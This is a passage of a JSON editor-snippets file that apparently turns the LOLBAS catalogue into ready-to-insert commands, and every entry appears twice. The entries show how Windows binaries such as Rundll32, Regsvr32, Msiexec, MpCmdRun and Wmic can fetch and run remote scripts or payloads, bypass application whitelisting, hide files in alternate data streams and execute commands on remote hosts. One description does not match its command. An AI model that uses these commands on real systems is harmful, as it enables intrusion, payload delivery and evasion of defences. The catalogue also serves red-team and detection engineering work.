        ],
        "description": "Regasm.exe is Part of .NET. it can Loads the target .DLL file and executes the UnRegisterClass function., requires  privilege, category: Execute, it can be used for Execute code and bypass Application whitelisting."
    },
    "lolbas Regasm.exe Execute code and bypass Application whitelisting": {
        "prefix": "lolbas Regasm.exe",
        "body": [
            "Regasm.exe is Part of .NET. it can Loads the target .DLL file and executes the UnRegisterClass function., requires  privilege, category: Execute, it can be used for Execute code and bypass Application whitelisting.",
            "",
            "```sh",
            "regasm.exe /U {PATH:.dll}${0}",
            "```"
        ],
        "description": "Regasm.exe is Part of .NET. it can Loads the target .DLL file and executes the UnRegisterClass function., requires  privilege, category: Execute, it can be used for Execute code and bypass Application whitelisting."
    },
    "Gpscript.exe Add local group policy logon script to execute file and hide from defensive counter measures (lolbas)": {
        "prefix": "Gpscript.exe",
        "body": [
            "Gpscript.exe is Used by group policy to process scripts. it can Executes startup scripts configured in Group Policy, requires  privilege, category: Execute, it can be used for Add local group policy logon script to execute file and hide from defensive counter measures.",
            "",
            "```sh",
            "Gpscript /startup${0}",
            "```"
        ],
        "description": "Gpscript.exe is Used by group policy to process scripts. it can Executes startup scripts configured in Group Policy, requires  privilege, category: Execute, it can be used for Add local group policy logon script to execute file and hide from defensive counter measures."
    },
    "lolbas Gpscript.exe Add local group policy logon script to execute file and hide from defensive counter measures": {
        "prefix": "lolbas Gpscript.exe",
        "body": [
            "Gpscript.exe is Used by group policy to process scripts. it can Executes startup scripts configured in Group Policy, requires  privilege, category: Execute, it can be used for Add local group policy logon script to execute file and hide from defensive counter measures.",
            "",
            "```sh",
            "Gpscript /startup${0}",
            "```"
        ],
        "description": "Gpscript.exe is Used by group policy to process scripts. it can Executes startup scripts configured in Group Policy, requires  privilege, category: Execute, it can be used for Add local group policy logon script to execute file and hide from defensive counter measures."
    },
    "Rundll32.exe Execute DLL file (lolbas)": {
        "prefix": "Rundll32.exe",
        "body": [
            "Rundll32.exe is Used by Windows to execute dll files. it can First part should be a DLL file (any extension accepted), EntryPoint should be the name of the entry point in the DLL file to execute., requires  privilege, category: Execute, it can be used for Execute DLL file.",
            "",
            "```sh",
            "rundll32.exe {PATH},EntryPoint${0}",
            "```"
        ],
        "description": "Rundll32.exe is Used by Windows to execute dll files. it can First part should be a DLL file (any extension accepted), EntryPoint should be the name of the entry point in the DLL file to execute., requires  privilege, category: Execute, it can be used for Execute DLL file."
    },
    "lolbas Rundll32.exe Execute DLL file": {
        "prefix": "lolbas Rundll32.exe",
        "body": [
            "Rundll32.exe is Used by Windows to execute dll files. it can First part should be a DLL file (any extension accepted), EntryPoint should be the name of the entry point in the DLL file to execute., requires  privilege, category: Execute, it can be used for Execute DLL file.",
            "",
            "```sh",
            "rundll32.exe {PATH},EntryPoint${0}",
            "```"
        ],
        "description": "Rundll32.exe is Used by Windows to execute dll files. it can First part should be a DLL file (any extension accepted), EntryPoint should be the name of the entry point in the DLL file to execute., requires  privilege, category: Execute, it can be used for Execute DLL file."
    },
    "Rundll32.exe Execute DLL from SMB share. (lolbas)": {
        "prefix": "Rundll32.exe",
        "body": [
            "Rundll32.exe is Used by Windows to execute dll files. it can Execute a DLL from an SMB share. EntryPoint is the name of the entry point in the DLL file to execute., requires  privilege, category: Execute, it can be used for Execute DLL from SMB share..",
            "",
            "```sh",
            "rundll32.exe {PATH_SMB:.dll},EntryPoint${0}",
            "```"
        ],
        "description": "Rundll32.exe is Used by Windows to execute dll files. it can Execute a DLL from an SMB share. EntryPoint is the name of the entry point in the DLL file to execute., requires  privilege, category: Execute, it can be used for Execute DLL from SMB share.."
    },
    "lolbas Rundll32.exe Execute DLL from SMB share.": {
        "prefix": "lolbas Rundll32.exe",
        "body": [
            "Rundll32.exe is Used by Windows to execute dll files. it can Execute a DLL from an SMB share. EntryPoint is the name of the entry point in the DLL file to execute., requires  privilege, category: Execute, it can be used for Execute DLL from SMB share..",
            "",
            "```sh",
            "rundll32.exe {PATH_SMB:.dll},EntryPoint${0}",
            "```"
        ],
        "description": "Rundll32.exe is Used by Windows to execute dll files. it can Execute a DLL from an SMB share. EntryPoint is the name of the entry point in the DLL file to execute., requires  privilege, category: Execute, it can be used for Execute DLL from SMB share.."
    },
    "Rundll32.exe Execute code from Internet (lolbas)": {
        "prefix": "Rundll32.exe",
        "body": [
            "Rundll32.exe is Used by Windows to execute dll files. it can Use Rundll32.exe to execute a JavaScript script that calls a remote JavaScript script., requires  privilege, category: Execute, it can be used for Execute code from Internet.",
            "",
            "```sh",
            "rundll32.exe javascript:\"\\..\\mshtml,RunHTMLApplication \";document.write();GetObject(\"script:{REMOTEURL}\")${0}",
            "```"
        ],
        "description": "Rundll32.exe is Used by Windows to execute dll files. it can Use Rundll32.exe to execute a JavaScript script that calls a remote JavaScript script., requires  privilege, category: Execute, it can be used for Execute code from Internet."
    },
    "lolbas Rundll32.exe Execute code from Internet": {
        "prefix": "lolbas Rundll32.exe",
        "body": [
            "Rundll32.exe is Used by Windows to execute dll files. it can Use Rundll32.exe to execute a JavaScript script that calls a remote JavaScript script., requires  privilege, category: Execute, it can be used for Execute code from Internet.",
            "",
            "```sh",
            "rundll32.exe javascript:\"\\..\\mshtml,RunHTMLApplication \";document.write();GetObject(\"script:{REMOTEURL}\")${0}",
            "```"
        ],
        "description": "Rundll32.exe is Used by Windows to execute dll files. it can Use Rundll32.exe to execute a JavaScript script that calls a remote JavaScript script., requires  privilege, category: Execute, it can be used for Execute code from Internet."
    },
    "Rundll32.exe Execute code from alternate data stream (lolbas)": {
        "prefix": "Rundll32.exe",
        "body": [
            "Rundll32.exe is Used by Windows to execute dll files. it can Use Rundll32.exe to execute a .DLL file stored in an Alternate Data Stream (ADS)., requires  privilege, category: ADS, it can be used for Execute code from alternate data stream.",
            "",
            "```sh",
            "rundll32 \"{PATH}:ADSDLL.dll\",DllMain${0}",
            "```"
        ],
        "description": "Rundll32.exe is Used by Windows to execute dll files. it can Use Rundll32.exe to execute a .DLL file stored in an Alternate Data Stream (ADS)., requires  privilege, category: ADS, it can be used for Execute code from alternate data stream."
    },
    "lolbas Rundll32.exe Execute code from alternate data stream": {
        "prefix": "lolbas Rundll32.exe",
        "body": [
            "Rundll32.exe is Used by Windows to execute dll files. it can Use Rundll32.exe to execute a .DLL file stored in an Alternate Data Stream (ADS)., requires  privilege, category: ADS, it can be used for Execute code from alternate data stream.",
            "",
            "```sh",
            "rundll32 \"{PATH}:ADSDLL.dll\",DllMain${0}",
            "```"
        ],
        "description": "Rundll32.exe is Used by Windows to execute dll files. it can Use Rundll32.exe to execute a .DLL file stored in an Alternate Data Stream (ADS)., requires  privilege, category: ADS, it can be used for Execute code from alternate data stream."
    },
    "Rundll32.exe Execute a DLL/EXE COM server payload or ScriptletURL code. (lolbas)": {
        "prefix": "Rundll32.exe",
        "body": [
            "Rundll32.exe is Used by Windows to execute dll files. it can Use Rundll32.exe to load a registered or hijacked COM Server payload. Also works with ProgID., requires  privilege, category: Execute, it can be used for Execute a DLL/EXE COM server payload or ScriptletURL code..",
            "",
            "```sh",
            "rundll32.exe -sta {CLSID}${0}",
            "```"
        ],
        "description": "Rundll32.exe is Used by Windows to execute dll files. it can Use Rundll32.exe to load a registered or hijacked COM Server payload. Also works with ProgID., requires  privilege, category: Execute, it can be used for Execute a DLL/EXE COM server payload or ScriptletURL code.."
    },
    "lolbas Rundll32.exe Execute a DLL/EXE COM server payload or ScriptletURL code.": {
        "prefix": "lolbas Rundll32.exe",
        "body": [
            "Rundll32.exe is Used by Windows to execute dll files. it can Use Rundll32.exe to load a registered or hijacked COM Server payload. Also works with ProgID., requires  privilege, category: Execute, it can be used for Execute a DLL/EXE COM server payload or ScriptletURL code..",
            "",
            "```sh",
            "rundll32.exe -sta {CLSID}${0}",
            "```"
        ],
        "description": "Rundll32.exe is Used by Windows to execute dll files. it can Use Rundll32.exe to load a registered or hijacked COM Server payload. Also works with ProgID., requires  privilege, category: Execute, it can be used for Execute a DLL/EXE COM server payload or ScriptletURL code.."
    },
    "Regsvr32.exe Execute code from remote scriptlet, bypass Application whitelisting (lolbas)": {
        "prefix": "Regsvr32.exe",
        "body": [
            "Regsvr32.exe is Used by Windows to register dlls. it can Execute the specified remote .SCT script with scrobj.dll., requires  privilege, category: Execute, it can be used for Execute code from remote scriptlet, bypass Application whitelisting.",
            "",
            "```sh",
            "regsvr32 /s /n /u /i:{REMOTEURL:.sct} scrobj.dll${0}",
            "```"
        ],
        "description": "Regsvr32.exe is Used by Windows to register dlls. it can Execute the specified remote .SCT script with scrobj.dll., requires  privilege, category: Execute, it can be used for Execute code from remote scriptlet, bypass Application whitelisting."
    },
    "lolbas Regsvr32.exe Execute code from remote scriptlet, bypass Application whitelisting": {
        "prefix": "lolbas Regsvr32.exe",
        "body": [
            "Regsvr32.exe is Used by Windows to register dlls. it can Execute the specified remote .SCT script with scrobj.dll., requires  privilege, category: Execute, it can be used for Execute code from remote scriptlet, bypass Application whitelisting.",
            "",
            "```sh",
            "regsvr32 /s /n /u /i:{REMOTEURL:.sct} scrobj.dll${0}",
            "```"
        ],
        "description": "Regsvr32.exe is Used by Windows to register dlls. it can Execute the specified remote .SCT script with scrobj.dll., requires  privilege, category: Execute, it can be used for Execute code from remote scriptlet, bypass Application whitelisting."
    },
    "Regsvr32.exe Execute code from scriptlet, bypass Application whitelisting (lolbas)": {
        "prefix": "Regsvr32.exe",
        "body": [
            "Regsvr32.exe is Used by Windows to register dlls. it can Execute the specified local .SCT script with scrobj.dll., requires  privilege, category: Execute, it can be used for Execute code from scriptlet, bypass Application whitelisting.",
            "",
            "```sh",
            "regsvr32.exe /s /u /i:{PATH:.sct} scrobj.dll${0}",
            "```"
        ],
        "description": "Regsvr32.exe is Used by Windows to register dlls. it can Execute the specified local .SCT script with scrobj.dll., requires  privilege, category: Execute, it can be used for Execute code from scriptlet, bypass Application whitelisting."
    },
    "lolbas Regsvr32.exe Execute code from scriptlet, bypass Application whitelisting": {
        "prefix": "lolbas Regsvr32.exe",
        "body": [
            "Regsvr32.exe is Used by Windows to register dlls. it can Execute the specified local .SCT script with scrobj.dll., requires  privilege, category: Execute, it can be used for Execute code from scriptlet, bypass Application whitelisting.",
            "",
            "```sh",
            "regsvr32.exe /s /u /i:{PATH:.sct} scrobj.dll${0}",
            "```"
        ],
        "description": "Regsvr32.exe is Used by Windows to register dlls. it can Execute the specified local .SCT script with scrobj.dll., requires  privilege, category: Execute, it can be used for Execute code from scriptlet, bypass Application whitelisting."
    },
    "Regedit.exe Hide registry data in alternate data stream (lolbas)": {
        "prefix": "Regedit.exe",
        "body": [
            "Regedit.exe is Used by Windows to manipulate registry. it can Export the target Registry key to the specified .REG file., requires  privilege, category: ADS, it can be used for Hide registry data in alternate data stream.",
            "",
            "```sh",
            "regedit /E {PATH_ABSOLUTE}:regfile.reg HKEY_CURRENT_USER\\MyCustomRegKey${0}",
            "```"
        ],
        "description": "Regedit.exe is Used by Windows to manipulate registry. it can Export the target Registry key to the specified .REG file., requires  privilege, category: ADS, it can be used for Hide registry data in alternate data stream."
    },
    "lolbas Regedit.exe Hide registry data in alternate data stream": {
        "prefix": "lolbas Regedit.exe",
        "body": [
            "Regedit.exe is Used by Windows to manipulate registry. it can Export the target Registry key to the specified .REG file., requires  privilege, category: ADS, it can be used for Hide registry data in alternate data stream.",
            "",
            "```sh",
            "regedit /E {PATH_ABSOLUTE}:regfile.reg HKEY_CURRENT_USER\\MyCustomRegKey${0}",
            "```"
        ],
        "description": "Regedit.exe is Used by Windows to manipulate registry. it can Export the target Registry key to the specified .REG file., requires  privilege, category: ADS, it can be used for Hide registry data in alternate data stream."
    },
    "Regedit.exe Import hidden registry data from alternate data stream (lolbas)": {
        "prefix": "Regedit.exe",
        "body": [
            "Regedit.exe is Used by Windows to manipulate registry. it can Import the target .REG file into the Registry., requires  privilege, category: ADS, it can be used for Import hidden registry data from alternate data stream.",
            "",
            "```sh",
            "regedit {PATH_ABSOLUTE}:regfile.reg${0}",
            "```"
        ],
        "description": "Regedit.exe is Used by Windows to manipulate registry. it can Import the target .REG file into the Registry., requires  privilege, category: ADS, it can be used for Import hidden registry data from alternate data stream."
    },
    "lolbas Regedit.exe Import hidden registry data from alternate data stream": {
        "prefix": "lolbas Regedit.exe",
        "body": [
            "Regedit.exe is Used by Windows to manipulate registry. it can Import the target .REG file into the Registry., requires  privilege, category: ADS, it can be used for Import hidden registry data from alternate data stream.",
            "",
            "```sh",
            "regedit {PATH_ABSOLUTE}:regfile.reg${0}",
            "```"
        ],
        "description": "Regedit.exe is Used by Windows to manipulate registry. it can Import the target .REG file into the Registry., requires  privilege, category: ADS, it can be used for Import hidden registry data from alternate data stream."
    },
    "Msiexec.exe Execute custom made msi file with attack code (lolbas)": {
        "prefix": "Msiexec.exe",
        "body": [
            "Msiexec.exe is Used by Windows to execute msi files. it can Installs the target .MSI file silently., requires  privilege, category: Execute, it can be used for Execute custom made msi file with attack code.",
            "",
            "```sh",
            "msiexec /quiet /i {PATH:.msi}${0}",
            "```"
        ],
        "description": "Msiexec.exe is Used by Windows to execute msi files. it can Installs the target .MSI file silently., requires  privilege, category: Execute, it can be used for Execute custom made msi file with attack code."
    },
    "lolbas Msiexec.exe Execute custom made msi file with attack code": {
        "prefix": "lolbas Msiexec.exe",
        "body": [
            "Msiexec.exe is Used by Windows to execute msi files. it can Installs the target .MSI file silently., requires  privilege, category: Execute, it can be used for Execute custom made msi file with attack code.",
            "",
            "```sh",
            "msiexec /quiet /i {PATH:.msi}${0}",
            "```"
        ],
        "description": "Msiexec.exe is Used by Windows to execute msi files. it can Installs the target .MSI file silently., requires  privilege, category: Execute, it can be used for Execute custom made msi file with attack code."
    },
    "Msiexec.exe Execute custom made msi file with attack code from remote server (lolbas)": {
        "prefix": "Msiexec.exe",
        "body": [
            "Msiexec.exe is Used by Windows to execute msi files. it can Installs the target remote & renamed .MSI file silently., requires  privilege, category: Execute, it can be used for Execute custom made msi file with attack code from remote server.",
            "",
            "```sh",
            "msiexec /q /i {REMOTEURL}${0}",
            "```"
        ],
        "description": "Msiexec.exe is Used by Windows to execute msi files. it can Installs the target remote & renamed .MSI file silently., requires  privilege, category: Execute, it can be used for Execute custom made msi file with attack code from remote server."
    },
    "lolbas Msiexec.exe Execute custom made msi file with attack code from remote server": {
        "prefix": "lolbas Msiexec.exe",
        "body": [
            "Msiexec.exe is Used by Windows to execute msi files. it can Installs the target remote & renamed .MSI file silently., requires  privilege, category: Execute, it can be used for Execute custom made msi file with attack code from remote server.",
            "",
            "```sh",
            "msiexec /q /i {REMOTEURL}${0}",
            "```"
        ],
        "description": "Msiexec.exe is Used by Windows to execute msi files. it can Installs the target remote & renamed .MSI file silently., requires  privilege, category: Execute, it can be used for Execute custom made msi file with attack code from remote server."
    },
    "Msiexec.exe Execute dll files (lolbas)": {
        "prefix": "Msiexec.exe",
        "body": [
            "Msiexec.exe is Used by Windows to execute msi files. it can Calls DllUnregisterServer to un-register the target DLL., requires  privilege, category: Execute, it can be used for Execute dll files.",
            "",
            "```sh",
            "msiexec /z {PATH_ABSOLUTE:.dll}${0}",
            "```"
        ],
        "description": "Msiexec.exe is Used by Windows to execute msi files. it can Calls DllUnregisterServer to un-register the target DLL., requires  privilege, category: Execute, it can be used for Execute dll files."
    },
    "lolbas Msiexec.exe Execute dll files": {
        "prefix": "lolbas Msiexec.exe",
        "body": [
            "Msiexec.exe is Used by Windows to execute msi files. it can Calls DllUnregisterServer to un-register the target DLL., requires  privilege, category: Execute, it can be used for Execute dll files.",
            "",
            "```sh",
            "msiexec /z {PATH_ABSOLUTE:.dll}${0}",
            "```"
        ],
        "description": "Msiexec.exe is Used by Windows to execute msi files. it can Calls DllUnregisterServer to un-register the target DLL., requires  privilege, category: Execute, it can be used for Execute dll files."
    },
    "Msiexec.exe Install trusted and signed msi file, with additional attack code as transformation file, from a remote server (lolbas)": {
        "prefix": "Msiexec.exe",
        "body": [
            "Msiexec.exe is Used by Windows to execute msi files. it can Installs the target .MSI file from a remote URL, the file can be signed by vendor. Additional to the file a transformation file will be used, which can contains malicious code or binaries. The /qb will skip user input., requires  privilege, category: Execute, it can be used for Install trusted and signed msi file, with additional attack code as transformation file, from a remote server.",
            "",
            "```sh",
            "msiexec /i {PATH_ABSOLUTE:.msi} TRANSFORMS=\"{REMOTEURL:.mst}\" /qb${0}",
            "```"
        ],
        "description": "Msiexec.exe is Used by Windows to execute msi files. it can Installs the target .MSI file from a remote URL, the file can be signed by vendor. Additional to the file a transformation file will be used, which can contains malicious code or binaries. The /qb will skip user input., requires  privilege, category: Execute, it can be used for Install trusted and signed msi file, with additional attack code as transformation file, from a remote server."
    },
    "lolbas Msiexec.exe Install trusted and signed msi file, with additional attack code as transformation file, from a remote server": {
        "prefix": "lolbas Msiexec.exe",
        "body": [
            "Msiexec.exe is Used by Windows to execute msi files. it can Installs the target .MSI file from a remote URL, the file can be signed by vendor. Additional to the file a transformation file will be used, which can contains malicious code or binaries. The /qb will skip user input., requires  privilege, category: Execute, it can be used for Install trusted and signed msi file, with additional attack code as transformation file, from a remote server.",
            "",
            "```sh",
            "msiexec /i {PATH_ABSOLUTE:.msi} TRANSFORMS=\"{REMOTEURL:.mst}\" /qb${0}",
            "```"
        ],
        "description": "Msiexec.exe is Used by Windows to execute msi files. it can Installs the target .MSI file from a remote URL, the file can be signed by vendor. Additional to the file a transformation file will be used, which can contains malicious code or binaries. The /qb will skip user input., requires  privilege, category: Execute, it can be used for Install trusted and signed msi file, with additional attack code as transformation file, from a remote server."
    },
    "wuauclt.exe Execute dll via attach/detach methods (lolbas)": {
        "prefix": "wuauclt.exe",
        "body": [
            "wuauclt.exe is Windows Update Client. it can Loads and executes DLL code on attach., requires  privilege, category: Execute, it can be used for Execute dll via attach/detach methods.",
            "",
            "```sh",
            "wuauclt.exe /UpdateDeploymentProvider {PATH_ABSOLUTE:.dll} /RunHandlerComServer${0}",
            "```"
        ],
        "description": "wuauclt.exe is Windows Update Client. it can Loads and executes DLL code on attach., requires  privilege, category: Execute, it can be used for Execute dll via attach/detach methods."
    },
    "lolbas wuauclt.exe Execute dll via attach/detach methods": {
        "prefix": "lolbas wuauclt.exe",
        "body": [
            "wuauclt.exe is Windows Update Client. it can Loads and executes DLL code on attach., requires  privilege, category: Execute, it can be used for Execute dll via attach/detach methods.",
            "",
            "```sh",
            "wuauclt.exe /UpdateDeploymentProvider {PATH_ABSOLUTE:.dll} /RunHandlerComServer${0}",
            "```"
        ],
        "description": "wuauclt.exe is Windows Update Client. it can Loads and executes DLL code on attach., requires  privilege, category: Execute, it can be used for Execute dll via attach/detach methods."
    },
    "Presentationhost.exe Execute code within XBAP files (lolbas)": {
        "prefix": "Presentationhost.exe",
        "body": [
            "Presentationhost.exe is File is used for executing Browser applications. it can Executes the target XAML Browser Application (XBAP) file, requires  privilege, category: Execute, it can be used for Execute code within XBAP files.",
            "",
            "```sh",
            "Presentationhost.exe {PATH_ABSOLUTE:.xbap}${0}",
            "```"
        ],
        "description": "Presentationhost.exe is File is used for executing Browser applications. it can Executes the target XAML Browser Application (XBAP) file, requires  privilege, category: Execute, it can be used for Execute code within XBAP files."
    },
    "lolbas Presentationhost.exe Execute code within XBAP files": {
        "prefix": "lolbas Presentationhost.exe",
        "body": [
            "Presentationhost.exe is File is used for executing Browser applications. it can Executes the target XAML Browser Application (XBAP) file, requires  privilege, category: Execute, it can be used for Execute code within XBAP files.",
            "",
            "```sh",
            "Presentationhost.exe {PATH_ABSOLUTE:.xbap}${0}",
            "```"
        ],
        "description": "Presentationhost.exe is File is used for executing Browser applications. it can Executes the target XAML Browser Application (XBAP) file, requires  privilege, category: Execute, it can be used for Execute code within XBAP files."
    },
    "Presentationhost.exe Downloads payload from remote server (lolbas)": {
        "prefix": "Presentationhost.exe",
        "body": [
            "Presentationhost.exe is File is used for executing Browser applications. it can It will download a remote payload and place it in INetCache., requires  privilege, category: Download, it can be used for Downloads payload from remote server.",
            "",
            "```sh",
            "Presentationhost.exe {REMOTEURL}${0}",
            "```"
        ],
        "description": "Presentationhost.exe is File is used for executing Browser applications. it can It will download a remote payload and place it in INetCache., requires  privilege, category: Download, it can be used for Downloads payload from remote server."
    },
    "lolbas Presentationhost.exe Downloads payload from remote server": {
        "prefix": "lolbas Presentationhost.exe",
        "body": [
            "Presentationhost.exe is File is used for executing Browser applications. it can It will download a remote payload and place it in INetCache., requires  privilege, category: Download, it can be used for Downloads payload from remote server.",
            "",
            "```sh",
            "Presentationhost.exe {REMOTEURL}${0}",
            "```"
        ],
        "description": "Presentationhost.exe is File is used for executing Browser applications. it can It will download a remote payload and place it in INetCache., requires  privilege, category: Download, it can be used for Downloads payload from remote server."
    },
    "Regini.exe Write to registry (lolbas)": {
        "prefix": "Regini.exe",
        "body": [
            "Regini.exe is Used to manipulate the registry. it can Write registry keys from data inside the Alternate data stream., requires  privilege, category: ADS, it can be used for Write to registry.",
            "",
            "```sh",
            "regini.exe {PATH}:hidden.ini${0}",
            "```"
        ],
        "description": "Regini.exe is Used to manipulate the registry. it can Write registry keys from data inside the Alternate data stream., requires  privilege, category: ADS, it can be used for Write to registry."
    },
    "lolbas Regini.exe Write to registry": {
        "prefix": "lolbas Regini.exe",
        "body": [
            "Regini.exe is Used to manipulate the registry. it can Write registry keys from data inside the Alternate data stream., requires  privilege, category: ADS, it can be used for Write to registry.",
            "",
            "```sh",
            "regini.exe {PATH}:hidden.ini${0}",
            "```"
        ],
        "description": "Regini.exe is Used to manipulate the registry. it can Write registry keys from data inside the Alternate data stream., requires  privilege, category: ADS, it can be used for Write to registry."
    },
    "MpCmdRun.exe Download file (lolbas)": {
        "prefix": "MpCmdRun.exe",
        "body": [
            "MpCmdRun.exe is Binary part of Windows Defender. Used to manage settings in Windows Defender. it can Download file to specified path - Slashes work as well as dashes (/DownloadFile, /url, /path) [updated version to bypass Windows 10 mitigation], requires  privilege, category: Download, it can be used for Download file.",
            "",
            "```sh",
            "copy \"C:\\ProgramData\\Microsoft\\Windows Defender\\Platform\\4.18.2008.9-0\\MpCmdRun.exe\" C:\\Users\\Public\\Downloads\\MP.exe && chdir \"C:\\ProgramData\\Microsoft\\Windows Defender\\Platform\\4.18.2008.9-0\\\" && \"C:\\Users\\Public\\Downloads\\MP.exe\" -DownloadFile -url {REMOTEURL:.exe} -path C:\\Users\\Public\\Downloads\\evil.exe${0}",
            "```"
        ],
        "description": "MpCmdRun.exe is Binary part of Windows Defender. Used to manage settings in Windows Defender. it can Download file to specified path - Slashes work as well as dashes (/DownloadFile, /url, /path) [updated version to bypass Windows 10 mitigation], requires  privilege, category: Download, it can be used for Download file."
    },
    "lolbas MpCmdRun.exe Download file": {
        "prefix": "lolbas MpCmdRun.exe",
        "body": [
            "MpCmdRun.exe is Binary part of Windows Defender. Used to manage settings in Windows Defender. it can Download file to specified path - Slashes work as well as dashes (/DownloadFile, /url, /path) [updated version to bypass Windows 10 mitigation], requires  privilege, category: Download, it can be used for Download file.",
            "",
            "```sh",
            "copy \"C:\\ProgramData\\Microsoft\\Windows Defender\\Platform\\4.18.2008.9-0\\MpCmdRun.exe\" C:\\Users\\Public\\Downloads\\MP.exe && chdir \"C:\\ProgramData\\Microsoft\\Windows Defender\\Platform\\4.18.2008.9-0\\\" && \"C:\\Users\\Public\\Downloads\\MP.exe\" -DownloadFile -url {REMOTEURL:.exe} -path C:\\Users\\Public\\Downloads\\evil.exe${0}",
            "```"
        ],
        "description": "MpCmdRun.exe is Binary part of Windows Defender. Used to manage settings in Windows Defender. it can Download file to specified path - Slashes work as well as dashes (/DownloadFile, /url, /path) [updated version to bypass Windows 10 mitigation], requires  privilege, category: Download, it can be used for Download file."
    },
    "MpCmdRun.exe Hide downloaded data into an Alternate Data Stream (lolbas)": {
        "prefix": "MpCmdRun.exe",
        "body": [
            "MpCmdRun.exe is Binary part of Windows Defender. Used to manage settings in Windows Defender. it can Download file to machine and store it in Alternate Data Stream, requires  privilege, category: ADS, it can be used for Hide downloaded data into an Alternate Data Stream.",
            "",
            "```sh",
            "MpCmdRun.exe -DownloadFile -url {REMOTEURL:.exe} -path {PATH_ABSOLUTE:.exe}:evil.exe${0}",
            "```"
        ],
        "description": "MpCmdRun.exe is Binary part of Windows Defender. Used to manage settings in Windows Defender. it can Download file to machine and store it in Alternate Data Stream, requires  privilege, category: ADS, it can be used for Hide downloaded data into an Alternate Data Stream."
    },
    "lolbas MpCmdRun.exe Hide downloaded data into an Alternate Data Stream": {
        "prefix": "lolbas MpCmdRun.exe",
        "body": [
            "MpCmdRun.exe is Binary part of Windows Defender. Used to manage settings in Windows Defender. it can Download file to machine and store it in Alternate Data Stream, requires  privilege, category: ADS, it can be used for Hide downloaded data into an Alternate Data Stream.",
            "",
            "```sh",
            "MpCmdRun.exe -DownloadFile -url {REMOTEURL:.exe} -path {PATH_ABSOLUTE:.exe}:evil.exe${0}",
            "```"
        ],
        "description": "MpCmdRun.exe is Binary part of Windows Defender. Used to manage settings in Windows Defender. it can Download file to machine and store it in Alternate Data Stream, requires  privilege, category: ADS, it can be used for Hide downloaded data into an Alternate Data Stream."
    },
    "Wmic.exe Execute binary file hidden in Alternate data streams to evade defensive counter measures (lolbas)": {
        "prefix": "Wmic.exe",
        "body": [
            "Wmic.exe is The WMI command-line (WMIC) utility provides a command-line interface for WMI. it can Execute a .EXE file stored as an Alternate Data Stream (ADS), requires  privilege, category: ADS, it can be used for Execute binary file hidden in Alternate data streams to evade defensive counter measures.",
            "",
            "```sh",
            "wmic.exe process call create \"{PATH_ABSOLUTE}:program.exe\"${0}",
            "```"
        ],
        "description": "Wmic.exe is The WMI command-line (WMIC) utility provides a command-line interface for WMI. it can Execute a .EXE file stored as an Alternate Data Stream (ADS), requires  privilege, category: ADS, it can be used for Execute binary file hidden in Alternate data streams to evade defensive counter measures."
    },
    "lolbas Wmic.exe Execute binary file hidden in Alternate data streams to evade defensive counter measures": {
        "prefix": "lolbas Wmic.exe",
        "body": [
            "Wmic.exe is The WMI command-line (WMIC) utility provides a command-line interface for WMI. it can Execute a .EXE file stored as an Alternate Data Stream (ADS), requires  privilege, category: ADS, it can be used for Execute binary file hidden in Alternate data streams to evade defensive counter measures.",
            "",
            "```sh",
            "wmic.exe process call create \"{PATH_ABSOLUTE}:program.exe\"${0}",
            "```"
        ],
        "description": "Wmic.exe is The WMI command-line (WMIC) utility provides a command-line interface for WMI. it can Execute a .EXE file stored as an Alternate Data Stream (ADS), requires  privilege, category: ADS, it can be used for Execute binary file hidden in Alternate data streams to evade defensive counter measures."
    },
    "Wmic.exe Execute binary from wmic to evade defensive counter measures (lolbas)": {
        "prefix": "Wmic.exe",
        "body": [
            "Wmic.exe is The WMI command-line (WMIC) utility provides a command-line interface for WMI. it can Execute calc from wmic, requires  privilege, category: Execute, it can be used for Execute binary from wmic to evade defensive counter measures.",
            "",
            "```sh",
            "wmic.exe process call create \"{CMD}\"${0}",
            "```"
        ],
        "description": "Wmic.exe is The WMI command-line (WMIC) utility provides a command-line interface for WMI. it can Execute calc from wmic, requires  privilege, category: Execute, it can be used for Execute binary from wmic to evade defensive counter measures."
    },
    "lolbas Wmic.exe Execute binary from wmic to evade defensive counter measures": {
        "prefix": "lolbas Wmic.exe",
        "body": [
            "Wmic.exe is The WMI command-line (WMIC) utility provides a command-line interface for WMI. it can Execute calc from wmic, requires  privilege, category: Execute, it can be used for Execute binary from wmic to evade defensive counter measures.",
            "",
            "```sh",
            "wmic.exe process call create \"{CMD}\"${0}",
            "```"
        ],
        "description": "Wmic.exe is The WMI command-line (WMIC) utility provides a command-line interface for WMI. it can Execute calc from wmic, requires  privilege, category: Execute, it can be used for Execute binary from wmic to evade defensive counter measures."
    },
    "Wmic.exe Execute binary on a remote system (lolbas)": {
        "prefix": "Wmic.exe",
        "body": [
            "Wmic.exe is The WMI command-line (WMIC) utility provides a command-line interface for WMI. it can Execute evil.exe on the remote system., requires  privilege, category: Execute, it can be used for Execute binary on a remote system.",
            "",
            "```sh",
            "wmic.exe /node:\"192.168.0.1\" process call create \"{CMD}\"${0}",
            "```"
        ],
        "description": "Wmic.exe is The WMI command-line (WMIC) utility provides a command-line interface for WMI. it can Execute evil.exe on the remote system., requires  privilege, category: Execute, it can be used for Execute binary on a remote system."
    },
    "lolbas Wmic.exe Execute binary on a remote system": {
        "prefix": "lolbas Wmic.exe",
        "body": [
            "Wmic.exe is The WMI command-line (WMIC) utility provides a command-line interface for WMI. it can Execute evil.exe on the remote system., requires  privilege, category: Execute, it can be used for Execute binary on a remote system.",
            "",
            "```sh",
            "wmic.exe /node:\"192.168.0.1\" process call create \"{CMD}\"${0}",
            "```"
        ],
        "description": "Wmic.exe is The WMI command-line (WMIC) utility provides a command-line interface for WMI. it can Execute evil.exe on the remote system., requires  privilege, category: Execute, it can be used for Execute binary on a remote system."
    },
    "Wmic.exe Execute binary on remote system (lolbas)": {
        "prefix": "Wmic.exe",
        "body": [
            "Wmic.exe is The WMI command-line (WMIC) utility provides a command-line interface for WMI. it can Create a volume shadow copy of NTDS.dit that can be copied., requires  privilege, category: Execute, it can be used for Execute binary on remote system.",
            "",
            "```sh",
            "wmic.exe process get brief /format:\"{REMOTEURL:.xsl}\"${0}",
            "```"
        ],
        "description": "Wmic.exe is The WMI command-line (WMIC) utility provides a command-line interface for WMI. it can Create a volume shadow copy of NTDS.dit that can be copied., requires  privilege, category: Execute, it can be used for Execute binary on remote system."
    },
    "lolbas Wmic.exe Execute binary on remote system": {
        "prefix": "lolbas Wmic.exe",
        "body": [
            "Wmic.exe is The WMI command-line (WMIC) utility provides a command-line interface for WMI. it can Create a volume shadow copy of NTDS.dit that can be copied., requires  privilege, category: Execute, it can be used for Execute binary on remote system.",
            "",
            "```sh",
